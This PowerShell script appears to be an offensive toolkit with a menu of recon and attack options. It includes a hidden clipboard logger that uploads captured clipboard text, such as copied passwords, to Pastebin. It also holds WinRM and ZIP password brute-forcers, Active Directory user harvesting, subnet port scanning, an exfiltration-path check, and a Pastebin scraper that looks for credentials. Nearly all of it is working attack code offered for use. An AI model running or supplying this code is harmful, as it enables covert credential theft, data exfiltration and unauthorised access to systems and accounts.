$logo = @(
'__________           ._____________       ___.  ___.   .__  __                \\\,_',
'\______   \ ____   __| _/\______   \_____ \_ |__\_ |__ |__|/  |_               \` ,\ ',
' |       _// __ \ / __ |  |       _/\__  \ | __ \| __ \|  \   __\         __,.-" =__)',
' |    |   \  ___// /_/ |  |    |   \ / __ \| \_\ \ \_\ \  ||  |         ."        )',
' |____|_  /\___  >____ |  >___  >____|_  /(____  /___  /___/__|      ,_/   ,    \/\_',
'        \/     \/     \/      \/       \/      \/    \/    \/        \_|    )_-\ \_-`',
"",
"Creator: https://securethelogs.com / @securethelogs",
"")

$logo

    $who = whoami
    $hostn = hostname
   

    Write-Output "Current User: $who | Current Machine: $hostn"
    
    Write-Output ""

    Write-Output "Please select one of the following:"
    Write-Output ""

    
    Write-Output "Option 1: Quick Recon"
    Write-Output "Option 2: Scan Subnet"
    Write-Output "Option 3: Clipboard Logger"
    Write-Output "Option 4: Network Scanner"
    Write-Output "Option 5: DNS Resolver"
    Write-Output "Option 6: Brute Force ZIP"
    Write-Output "Option 7: Brute WinRM"
    Write-Output "Option 8: Test Extraction Connection"
    Write-Output "Option 9: Show Local Firewall Deny Rules"

    Write-Output ""
    Write-Output " --- OSINT Options ----"
    Write-Output ""

    Write-Output "Option A: Find Subdomains"
    Write-Output "Option B: Daily PasteBin"
    Write-Output "Option C: Scan Azure Resource"
    Write-Output "Option D: Scan Socials For Usernames"

    

    Write-Output ""
    
    
    [string]$option = Read-Host -Prompt "Option:"


    # ----------------- Quick Recon ----------------------------------

    if ($option -eq "1"){
    
    
$user = whoami
$currenthost = hostname 
$networkinfo = (Get-NetIPAddress).IPAddress


Write-Output ""
Write-Output "User: $user"
Write-Output "Hostname: $currenthost"
Write-Output ""
Write-Output "Network IP/s:"
$networkinfo
Write-Output ""
Write-Output "Getting details on $user......"

whoami /all


Write-Output ""
Write-Output "-------------------------------"
Write-Output ""
Write-Output "LOCAL ADMIN INFORMATION"
Write-Output "-----------------------"
Write-Output ""

net localgroup Administrators


Write-Output ""
Write-Output "-------------------------------"
Write-Output ""
Write-Output "LOCAL USERS INFORMATION"
Write-Output "-----------------------"
Write-Output ""

net users

Write-Output ""
Write-Output "-------------------------------"
Write-Output ""
Write-Output "CURRENT LOGGED IN USERS"
Write-Output "-----------------------"
Write-Output ""


query user /server:$SERVER


Write-Output ""
Write-Output "-------------------------------"
Write-Output ""
Write-Output "PROGRAM INFORMATION"
Write-Output "-------------------"
Write-Output ""

$progs = (dir "c:\program files").Name
$progs32 = (dir "c:\Program Files (x86)").Name
$allprogs = @($progs,$progs32)

$allprogs


Write-Output ""
Write-Output "-------------------------------"
Write-Output ""
Write-Output "INTERNET ACCESS TEST"
Write-Output "-------------------"
Write-Output ""


$Publicip = (curl http://ipinfo.io/ip).content
$internetcheckgoogle = (Test-NetConnection google.com -Port 443).TcpTestSucceeded
$internetcheckseclogs = (Test-NetConnection securethelogs.com -Port 443).TcpTestSucceeded
$internetcheckMicro = (Test-NetConnection Microsoft.com -Port 443).TcpTestSucceeded

Write-Output "Public IP: $Publicip"
Write-Output ""
Write-Output "Can I Reach Google: $internetcheckgoogle"
Write-Output "Can I Reach Securethelogs: $internetcheckseclogs"
Write-Output "Can I Reach Microsoft: $internetcheckMicro"


Write-Output ""
Write-Output "-------------------------------"
Write-Output ""
Write-Output "FIREWALL INFORMATION"
Write-Output "-------------------"
Write-Output ""

Get-NetFirewallRule |
Format-Table -Property Name,
DisplayName,
DisplayGroup,
@{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},
@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}},
@{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},
@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}},
Enabled,
Profile,
Direction,
Action

Write-Output ""
    
    }
    
    
    # ------------ Scan Subnet ---------------------

    if ($option -eq "2"){



    $subnet = (Get-NetRoute -DestinationPrefix 0.0.0.0/0).NextHop
    $manyips = $subnet.Length

    if($manyips -eq 1){$subnet = (Get-NetRoute -DestinationPrefix 0.0.0.0/0).NextHop[0]}
    else{$subnet = (Get-NetRoute -DestinationPrefix 0.0.0.0/0).NextHop[1]}
    
    
    $subnetrange = $subnet.Substring(0,$subnet.IndexOf('.') + 1 + $subnet.Substring($subnet.IndexOf('.') + 1).IndexOf('.') + 3)

    $isdot = $subnetrange.EndsWith('.')

    if ($isdot -like "False"){$subnetrange = $subnetrange + '.'}
    
$iprange = @(1..254)

Write-Output ""
Write-Output "Current Network: $subnet"
Write-Output ""
Write-Output "Scanning........"
Write-Output ""

foreach ($i in $iprange){


$currentip = $subnetrange + $i

$islive = test-connection $currentip -Quiet -Count 1

if ($islive -eq "True"){

$dnstest = (Resolve-DnsName $currentip).NameHost

if ($dnstest -like "*.home") {

$dnstest = $dnstest -replace ".home",""

}

Write-Output ""
Write-Output "Host is Reachable: $currentIP  |   DNS: $dnstest"


 # ------- Scanning host ---------

    $portstoscan = @(20,21,22,23,25,50,51,53,80,110,119,135,136,137,138,139,143,161,162,389,443,445,636,1025,1443,3389,5985,5986,8080,10000)
    $waittime = 100

    foreach ($p in $portstoscan){

    $TCPObject = new-Object system.Net.Sockets.TcpClient
    $result = $TCPObject.ConnectAsync($currentip,$p).Wait($waittime)

    if ($result -eq "True"){
    
    Write-Output "Port Open: $p"
    
    }

    }

    







}

}

    
    }


    # ------------- PSClippy ------------------------------------


    if ($option -eq "3"){
    
    Write-Output ""
    Write-Output "PSClippy - Log all copies to clipboard.."
    Write-Output ""
    
$record = Read-Host -Prompt "Enter P for PasteBin | Enter F for File"


if ($record -eq "f" -or $record -eq "F"){

$filechoice = 1
$fileloc = Read-Host -Prompt "Location of file"

$fileloc >> C:\temp\file.txt
attrib +h "C:\temp\file.txt"

}

if ($record -eq "p" -or $record -eq "P"){

$pasteapikey = Read-Host -Prompt "Paste API Key"
$pastename = Read-Host -Prompt "Paste Name"

if ($pastename -eq $null) {$pastename = "PSClippy"}

$pasteapikey >> C:\temp\api.txt
$pastename >> C:\temp\pastename.txt

attrib +h "C:\temp\api.txt"
attrib +h "C:\temp\pastename.txt"

}



PowerShell.exe -windowstyle hidden {

$testfile = Test-Path -Path C:\temp\file.txt
$testpaste = Test-Path -Path C:\temp\api.txt

if ($testfile -eq "True"){

$filechoice = 1
$fileloc = Get-Content C:\temp\file.txt

Remove-Item C:\temp\file.txt -Force

}

if ($testpaste -eq "True"){

$pastechoice = 1
$pasteapikey = Get-Content C:\temp\api.txt
$pastename = Get-Content C:\temp\pastename.txt

Remove-Item C:\temp\pastename.txt -Force
Remove-Item C:\temp\api.txt -Force

}





# * This is to show a concept. Do not use for harm! *

$pclip = ""
$array = @()
$counter = 0



while($true){

# Get Clipboard

$cclip = Get-Clipboard



# If the current and old match...do nothing

if ($pclip -eq $cclip){}


# if they don't add to array

else {


$array += $cclip
$pclip = $cclip
$cclip = Get-Clipboard

# Add to counter 

$counter++

if ($filechoice -eq 1){

$pclip >> $fileloc

}





}

if ($pastechoice -eq 1){


# At 10, upload to PasteBin. You will need to add your API key *

if ($counter -gt 9){


# Format Paste

$Body = @{    api_dev_key = ‘$pasteapikey’

    api_paste_code = (“$array”)

    api_paste_private = 0

    api_paste_name = ‘$pastename’

    api_option = ‘paste’

    api_user_key = ”"
}
# Upload To PasteBin
Invoke-WebRequest -Uri “https://pastebin.com/api/api_post.php" -UseBasicParsing -Body $Body -Method Post


$counter = 0

}


} # End of if paste = 1


# This can be changed to be longer but most password managers will remove after X seconds. 

Start-Sleep -Seconds 5


} 



} # Hidden
    
    
    }
    
    # ---------------- Network Scanner --------------------------

    if ($option -eq "4"){

    
       
    # Set Variables and Arrays

    $ScanAll = ""
    
    $waittime = 400
    $liveports = @()
   
    $destip = @() 
          
    $Portarray = @(20,21,22,23,25,50,51,53,80,110,119,135,136,137,138,139,143,161,162,389,443,445,636,1025,1443,3389,5985,5986,8080,10000)

    

    # -------------- Get the Details From The User -------------

    
    Write-Output ""

    # Get the Target/s
    
    Write-Output "Please enter either an IP Address, URL or File Path (Example: C:\Temp\IPList.txt)....."
    
    [string]$Typeofscan = Read-Host -Prompt "Target"
  

    if ($Typeofscan -like "*txt") {
    
    $PulledIPs = Get-Content $Typeofscan
    
    foreach ($i in $PulledIPs) {

    # Fill destination array with all IPs
    
    $destip += $i
    
    } # for each

    }

    else {
    
    # Single Scan

    $destip = $Typeofscan
    
    }


    # ------------------- Get the Ports -----------------
    Write-Output "`n"
    Write-Output "Option 1:  Common Scan |  Option 2:  Full Scan (1-65535) |  Options 3:  Quick Scan (Less Accurate)"
    Write-Output "--------------------------------------------------------------------------------------------------"

    $ScanPorts = Read-Host -Prompt "Option Number" 

    if ($ScanPorts -eq 1) {$ScanAll = ""}
    if ($ScanPorts -eq 2) {$ScanAll = "True"}
    if ($ScanPorts -eq 3) {$ScanAll = "Quick"}
    if ($ScanPorts -ne 1 -AND $ScanPorts -ne 2 -AND $ScanPorts -ne 3){exit}



  # --------------- Get the Ports -------------------------------------

 
    if ($ScanAll -eq "True") {

    $waittime = 400
    $Portarray = 1..65535 
    
    }

    if ($ScanAll -eq "Quick") {

    $waittime = 40
    $Portarray = 1..65535

    }

    else {
    
    # Portarray remains the same (Common ports)

    }



    #----------------------- SCAN -----------------------------------------

    
    Write-Output ""
    Write-Output "Running Scan................"
    

    foreach ($i in $destip){ # Scan Every Dest



    foreach ($p in $Portarray){


    $TCPObject = new-Object system.Net.Sockets.TcpClient

    $Result = $TCPObject.ConnectAsync($i,$p).Wait($waittime)


    if ($Result -eq "True") {
    
    $liveports += $p  

    }


    } # For each Array

    # --------------- Show Known Ports ------------------------------


    $Knownservices = @()
    
    $ftp = "Port: 20,21     Service: FTP"
    $http = "Port: 80     Service: HTTP"
    $https = "Port: 443     Service: HTTPS"
    $ssh = "Port: 22     Service: SSH"
    $telnet = "Port: 23     Service: Telnet"
    $smtp = "Port: 25     Service: SMTP"
    $ipsec = "Port: 50,51     Service: IPSec"
    $dns = "Port: 53     Service: DNS"
    $pop3 = "Port: 110     Service: POP3"
    $netbios = "Port: 135-139     Service: NetBIOS"
    $imap4 = "Port: 143     Service: IMAP4"
    $snmp = "Port: 161,162     Service: SNMP"
    $ldap = "Port: 389     Service: LDAP"
    $smb = "Port: 445     Service: SMB"
    $ldaps = "Port: 636     Service: LDAPS"
    $rpc = "Port: 1025     Service: Microsoft RPC"
    $sql = "Port: 1433     Service: SQL"
    $rdp = "Port: 3389     Service: RDP"
    $winrm = "Port: 5985,5986     Service: WinRM"
    $proxy = "Port: 8080     Service: HTTP Proxy"
    $webmin = "Port: 10000     Service: Webmin"
        

    if ($liveports -contains "20" -or $liveports -contains "21"){$knownservices += $ftp}
    if ($liveports -contains "22"){$knownservices += $ssh}
    if ($liveports -contains "23"){$knownservices += $telnet}
    if ($liveports -contains "50" -or $liveports -contains "51"){$knownservices += $ipsec}
    if ($liveports -contains "53"){$knownservices += $dns}
    if ($liveports -contains "80"){$knownservices += $http}
    if ($liveports -contains "110"){$knownservices += $pop3}
    if ($liveports -contains "135" -or $liveports -contains "136" -or $liveports -contains "137" -or $liveports -contains "138" -or $liveports -contains "139"){$knownservices += $netbios}
    if ($liveports -contains "143"){$knownservices += $IMAP4}
    if ($liveports -contains "161"-or $liveports -contains "162"){$knownservices += $snmp}
    if ($liveports -contains "389"){$knownservices += $ldap}
    if ($liveports -contains "443"){$knownservices += $https}
    if ($liveports -contains "445"){$knownservices += $smb}
    if ($liveports -contains "636"){$knownservices += $ldaps}
    if ($liveports -contains "1025"){$knownservices += $rpc}
    if ($liveports -contains "1433"){$knownservices += $sql}
    if ($liveports -contains "3389"){$knownservices += $rdp}
    if ($liveports -contains "5985" -or $liveports -contains "5986"){$knownservices += $winrm}
    if ($liveports -contains "8080"){$knownservices += $proxy}
    if ($liveports -contains "10000"){$knownservices += $webmin}
    
    # -------------------------- Output Results ---------------------------------
    
    Write-Output "--------------------------------------------------------------------------------------------------"
    Write-Output ""
    Write-Output "Target: $i"
    Write-Output ""
    Write-Output "Ports Found: "
    Write-Output ""
    Write-Output $liveports
    Write-Output ""
    Write-Output ""
    Write-Output "Known Services:"
    Write-Output ""
    Write-Output $Knownservices
    Write-Output ""
    

    #Clear Array for next
    $liveports = @()

    

    } # For Each $i in DestIP
    
    
    }






    if ($option -eq "5"){
    
    Write-Output ""


    Write-Output "Enter Either A Single IP or IP List (C:\Temp\example.txt)"
    
    
    [string]$gettargets = Read-Host -Prompt "."


  
    # -------------- If IP List ------------------

    if ($gettargets -like "*txt") {
    
    $PulledIPs = Get-Content $gettargets


    Write-Output ""
    Write-Output "Resolving...."

    
    foreach ($i in $PulledIPs) {

    # Test if can resolve
        
    $firsttest = Resolve-DnsName $i -erroraction SilentlyContinue

    # If not, show fail...

    if ($firsttest -eq $null){
    
    Write-Output ""

    Write-Output "IP: $i      |       DNS: Failed To Resolve"
    
    
    }

    #If can, show result...

    else {

    $resolve = (Resolve-DnsName $i).NameHost

    
    Write-Output ""

    Write-Output "IP: $i      |       DNS: $resolve"
   

    }
    
    } # for each

    Write-Output ""


    } # If txt
    
    # --------------- Attempt Single Scan ---------------

    else {

    $i = $gettargets
    
    # Test if can resolve

        
    $firsttest = Resolve-DnsName $i -erroraction SilentlyContinue

    # If not, show fail...

    if ($firsttest -eq $null){
    
    Write-Output ""

    Write-Output "IP: $i      |       DNS: Failed To Resolve"
    Write-Output ""
    
    }

    #If can, show result...

    else {

    $resolve = (Resolve-DnsName $i).NameHost

    
    Write-Output ""

    Write-Output "IP: $i      |       DNS: $resolve"
    Write-Output ""

    }

    }
    
    }


    # ------- Brute Force Zip ---------------------------

    if ($option -eq "6"){
    
    Write-Output ""
    
$7z = "C:\Program Files\7-Zip\7z.exe"
$testifinstalled = Test-Path "$7z"
$Thepasswordis = ""


if ($testifinstalled -eq "True") {

#Is Installed
Write-Output "7Zip installed........"
Write-Output "Let's Brute ........"
Write-Output "`n"

$ziploc = Read-Host -Prompt "Location of Zipped File :"
$Passwordlist = Read-Host -Prompt "Location of Wordlist :"
$passwords = Get-Content $Passwordlist

foreach ($i in $passwords){


$brute = & 'C:\Program Files\7-Zip\7z.exe' e "$ziploc" -p"$i" -y

if ($brute -contains "Everything is Ok"){

$Thepasswordis = $i

Write-Output "Password Found: $Thepasswordis"


} # Brute IF

else {

#do nothing

}


} # Foreach Rule


# ------------ Output End ---------------------

if ($Thepasswordis -eq "") {
Write-Output "------------ End -------------------"
Write-Output "`n"
Write-Output "Password Not Found"
Write-Output "`n"
}

else {

Write-Output "------------ End -------------------"
Write-Output "`n"
Write-Output "The Password Is: $Thepasswordis"
Write-Output "`n"

}



} # Testifinstalled If Rule



else {

#7Zip Isn't Installed

Write-Output "7Zip doesn't appear to be installed. This script requires it, so if you wish to use, please install."
Write-Output "`n"


}
    
    }


    # -------------------- WinRM Brute ------------------------------


    if ($option -eq "7"){
    
    
$targetcomputer = ""
$targetuser = @()
$targetpassword = @()



    #----------- Get the target computer ----------------------
    
    Write-Output "Please Enter The Targets Computer Name or IP"

    $compname = Read-Host -Prompt "Target"

    $targetcomputer = $compname

    Write-Output ""
    Write-Output "Please Select One Of The Following Options"
    
    Write-Output "Option 1: Single User | Option 2: Txt File Location | Option 3: Attempt To Extract From AD"
    
        
    [string]$useroption = Read-Host -Prompt "Option Number"

    # -------------user wants single user --------------------------
  
    if ($useroption -eq "1"){ 
    
    $useroption = Read-Host -Prompt "Enter Username"
    $targetuser += $useroption

    }

    # --------- User has a userlist ----------------

    if ($useroption -eq "2"){

    $useroption = Read-Host -Prompt "Enter Path Location"
    $pullusers = Get-Content -Path $useroption

    foreach ($i in $pullusers) {
    
    $targetuser += $i

    }
    
    }

    # --------- user wants to try recon ------------------------

    

    if ($useroption -eq "3"){

    $outputloc = "C:\Temp\users.txt"

    
    dsquery user -name * | dsget user -samid >> $outputloc
    
    $pullusers = Get-Content -Path $outputloc

    foreach ($i in $pullusers) {
    
    $targetuser += $i

    }


    } 

    

    if ($useroption -ne "1" -OR $useroption -ne "2" -OR $useroption -ne "3" ){
    
    #Catch fail
    
    }


  
  # ------------ Get Password List ------------------------

  Write-Output ""
  Write-Output "Please Enter The File Path Of Your Wordlist (C:\Temp\Wordlist.txt)"
 
  
  $passloc = Read-Host -Prompt "File Path"

  $passwordstotry = Get-Content -Path $passloc

  foreach ($p in $passwordstotry) {
  
  $targetpassword += $p 
  
  }



# --------------- Starting Scan -----------------------------

foreach ($u in $targetuser) {


foreach ($p in $targetpassword) {


$Error.clear()

$crackedcreds = @()
$hackedpassword = ""
  
         $secpassword = ConvertTo-SecureString $p -AsPlainText -Force
         $mycredential = New-Object System.Management.Automation.PSCredential ($u, $secpassword)

         #Test Connection of each password
        
         $result = Test-WSMan -ComputerName $targetcomputer -Credential $mycredential -Authentication Negotiate -erroraction SilentlyContinue


   if ($result -eq $null) {

    Write-Output "Testing Password: $p = Failed"
    
    $hackedpassword = $null

    } else {

    #results are successfull and show the password

    Write-Output "Testing Password: $p = Success"
    
    $crackedcreds += $u + "::" + $p
    
        
}



} # foreach password end



} # foreach user end




if ($crackedcreds -ne $null) {

Write-Output "---------------------------------------------------"
Write-Output ""
Write-Output "Success! Here Are The Credentials:"
Write-Output $crackedcreds
Write-Output ""

}

else {

Write-Output "---------------------------------------------------"
Write-Output ""
Write-Output "Brute Force Failed...."

}
    
    }






    if ($option -eq "8"){

    Write-output ""
    
    $extraction = Read-Host -Prompt "Extraction Destination (URL, IP, FQDN)"
    

    if ($extraction -like "*http*"){$extraction = $extraction -replace "https://","" -replace "http://",""}



    $smb = (Test-NetConnection -ComputerName $extraction -Port 445 -ErrorAction SilentlyContinue).tcptestsucceeded
    $http = (Test-NetConnection -ComputerName $extraction -Port 80 -ErrorAction SilentlyContinue).tcptestsucceeded
    $https = (Test-NetConnection -ComputerName $extraction -Port 443 -ErrorAction SilentlyContinue).tcptestsucceeded

    Write-Output ""
    Write-Output "Extraction Reachable on HTTP: $http"
    Write-Output "Extraction Reachable on HTTPS: $https"
    Write-Output "Extraction Reachable on SMB: $smb"
    Write-Output ""



    } else{


    
    
    
    }



    #}



    # ------------------ Show local firewall rules (deny) -------------------------



    if ($option -eq "9"){
    
    Get-NetFirewallRule | Where-Object Action -eq "Block" | Format-Table DisplayName,Enabled,Profile,Direction,Action,Name
    
    
    }







    if ($option -eq "10"){}
    if ($option -eq "11"){}






    #---------------------------------------------------------------------------------------------------------------------------

    # OSINT Options




  # --------------------------- Find Sub domains --------------------------------


    if ($option -eq "A"){
    
    
# Temp File Location

$tempfile = "C:\Temp\dnsenum.txt"


# Prompt for domain

Write-Output ""

[string]$domain = Read-Host -Prompt "Please Enter Your Domain"

# Scan Sites 

$virustotal = (curl https://www.virustotal.com/ui/domains/$domain/subdomains).content >> $tempfile 
$crt = (curl https://crt.sh/?q=%25.$domain).content >> $tempfile 


$arrayFromFile = @(Get-Content $tempfile)

# Delete temp file

Remove-Item –path $tempfile


Write-Output ""
Write-Output "Scanning..................... (May Contain Duplicates)"
Write-Output ""

foreach ($i in $arrayFromFile){

# ---------------- VirusTotal --------------------------

$VT = $i.Contains('"id":')

if ($VT -eq "True") {


#Remove fluff
$dnsfound = $i -replace '"id":',"" -replace '"',"" -replace ",","" -replace " ",""


#Print DNS Record
$dnsfound


} 



# ----------------- CRT Checking ------------------------

$test = $i.Contains("mundipharma.com<B")

if ($test -eq "True"){

# Remove fluff
$result = $i -replace "<BR>","`n" -replace "<TD>","`n" -replace "</BR>","`n" -replace "</TD>","`n `n----------"


$result


}


}

Write-Output ""

    
    
    }


    # ------------------- Daily PasteBin -----------------------------------

    if ($option -eq "B"){
    
    Write-Output ""
    Write-Output "*If you run multiple times within a short window, your IP will be blocked"

    

$filetosave = ""
$askstore = Read-Host "Would you list to store juicy findings? (Y/N)"

if ($askstore -eq "y" -or $askstore -eq "yes"){

$fileloc = Read-Host "Txt File Location:"


} else {

#Do nothing

}

if ($fileloc -like "*.txt"){

# Got a Txt File

$filetosave = $fileloc


} else {

# Mistake made

Write-Output "File location wasn't txt.....continuing without..."
$filetosave = $null
Write-Output ""

}






$pastes = @(curl https://pastebin.com/archive).links




foreach ($i in $pastes){


$title = $i.href

# Remove the junk
if ($title -eq "/pro" -or $title -eq "/api" -or $title -eq "/tools" -or $title -eq "/faq" -or $title -eq "_blank" -or $title -eq "/login" -or $title -eq "/signup" -or $title -eq "/archives" -or $title -eq "/" -or $title -eq "/languages" -or $title -eq "/night_mode" -or $title -eq "/dmca" -or $title -eq "/contact" -or $title -eq "#0" -or $title -like "*/archive*" -or $title -like "*/tools#*" -or $title -like "*/doc_*" -or $title -like "*http://*" -or $title -like "*https://*"){



} else{

$name = $i.innerText
$link = $i.href


Write-Output ""
Write-Output "Name: $name"
Write-Output "Link: https://pastebin.com/raw$link"


$contenturl = @((curl https://pastebin.com/raw$link).content) | Out-String

$getlenght = $contenturl.Length


if ($getlenght -gt 19){$content = $contenturl.subString(0,20) |Out-String}
if ($getlenght -gt 39){$content = $contenturl.subString(0,40) |Out-String}
if ($getlenght -gt 59){$content = $contenturl.subString(0,60) |Out-String}
if ($getlenght -gt 79){$content = $contenturl.subString(0,80) |Out-String}
if ($getlenght -gt 99){$content = $contenturl.subString(0,100) |Out-String}




Write-Output ""
Write-Output "Preview:"
$content
Write-Output ""
Write-Output "-----------------------------------"
Write-Output ""
Write-Output ""



# ---- Find something Juicy -------------


if ($contenturl -like "*admin*" -or $contenturl -like "*credentials*" -or $contenturl -like "*password*" -or $contenturl -like "*rdp*" -or $contenturl -like "*login" -or $contenturl -like "*username*" -or $contenturl -like "*API*"-or $contenturl -like "*hash*" -or $contenturl -like "*database=*" -or $contenturl -like "*ssh*" -or $contenturl -like "*wallet*" -or $contenturl -like "*root*" -or $contenturl -like "*@gmail.com:*"){

$storejuice = @()
$juicylink = @()

$storejuice += $contenturl
$juicylink += $i.href


}


} 
}

Write-Output "Pastes of Potential Interest (contains keywords)"
Write-Output ""

foreach ($l in $juicylink){

Write-Output "https://pastebin.com/raw$l"


}

Write-Output ""


# Save to TXT

if ($filetosave -eq $null){} else {

$storejuice >> $filetosave
Write-Output "Remember that Juicy content has been saved to $filetosave"

}


Write-Output ""
    
    
    }



    # --------------------- Zork Azure ---------------------------------------

    if ($option -eq "C"){
    
    
# Gather words

$location = Read-Host -Prompt "Enter your wordlist location (Example: C:\Temp\wordlist.txt):"

#Get the wordlist
$words = Get-Content $location


foreach ($word in $words) {

#clear all errors
        $Error.clear()

        
         $resultblob = Test-NetConnection "$word.blob.core.windows.net" -Port 80 -erroraction SilentlyContinue -InformationLevel Quiet -WarningAction silentlyContinue
         $resulttable = Test-NetConnection "$word.table.core.windows.net" -Port 80 -erroraction SilentlyContinue -InformationLevel Quiet -WarningAction silentlyContinue
         $resultqueue = Test-NetConnection "$word.queue.core.windows.net" -Port 80 -erroraction SilentlyContinue -InformationLevel Quiet -WarningAction silentlyContinue
         $resultfile = Test-NetConnection "$word.file.core.windows.net" -Port 80 -erroraction SilentlyContinue -InformationLevel Quiet -WarningAction silentlyContinue
         $resultdb = Test-NetConnection "$word.database.windows.net" -Port 1433 -erroraction SilentlyContinue -InformationLevel Quiet -WarningAction silentlyContinue

         

        

# ------ Search for Blob -----------------

         if ($resultblob -eq "True"){

Write-Output "Blob Storage Found: $word.blob.core.windows.net"

} else {

#Do nothing

}


# ------ Search for Tables -----------------

         if ($resulttable -eq "True"){

Write-Output "Table Found: $word.table.core.windows.net"

} else {

#Do nothing

}

# ------ Search for Queue -----------------

         if ($resultqueue -eq "True"){

Write-Output "Queue Found: $word.queue.core.windows.net"

} else {

#Do nothing

}

# ------ Search for Files -----------------


         if ($resultfile -eq "True"){

Write-Output "File Found: $word.file.core.windows.net"

} else {

#Do nothing

}

# ------ Search for Databases -----------------

         if ($resultdb -eq "True"){

Write-Output "Database Found: $word.database.windows.net"

} else {

#Do nothing

}



}
Write-Output "`n"
Write-Output "`n"
Write-Output "If no results were found, try checking your wordlist or network connection"

    
    }





    # ---------------------- Scan for socials -------------------------


    if ($option -eq "D"){
    
    
#Get the username

$userhandle = Read-Host -Prompt "Enter A Username: "

$myArray = @(
"https://twitter.com/$userhandle",
"https://www.instagram.com/$userhandle/",
"https://ws2.kik.com/user/$userhandle/",
"https://medium.com/@$userhandle",
"https://pastebin.com/u/$userhandle/",
"https://www.patreon.com/$userhandle/",
"https://photobucket.com/user/$userhandle/library",
"https://www.pinterest.com/$userhandle/",
"https://myspace.com/$userhandle/",
"https://www.reddit.com/user/$userhandle/"

)


Write-Output "`n"
Write-Output "Running Checks.............."
Write-Output "`n"

foreach ($i in $myArray) {

try

{

    $response = Invoke-WebRequest -Uri "$i" -ErrorAction Stop
    $StatusCode = $Response.StatusCode
}
catch
{
    $StatusCode = $_.Exception.Response.StatusCode.value__
}


if ($StatusCode -eq "200"){

Write-Output "Found one: $i"

}

if ($StatusCode -eq "404"){

#Site Does Not Exist - Do Nothing

}

else {

#Do Nothing

}

}

Write-Output "`n"


    }
